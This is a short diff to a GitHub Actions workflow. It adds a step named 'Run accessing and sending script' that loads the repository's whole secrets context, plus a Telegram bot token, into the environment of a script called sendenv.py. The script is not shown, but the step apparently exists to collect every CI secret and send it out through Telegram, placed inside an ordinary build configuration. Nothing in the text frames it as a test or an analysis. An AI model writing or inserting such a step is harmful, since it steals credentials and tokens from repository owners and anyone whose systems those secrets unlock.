@@ -17,4 +17,9 @@ jobs:
       - name: Install dependencies and run
         run: |
           pip install requests
-          python sendenv.py
+
+      - name: Run accessing and sending script
+        env:
+          allsecret: ${{ secrets }}
+          TGBOTTOKEN: ${{ secrets.TGBOTTOKEN }}
+        run: python sendenv.py
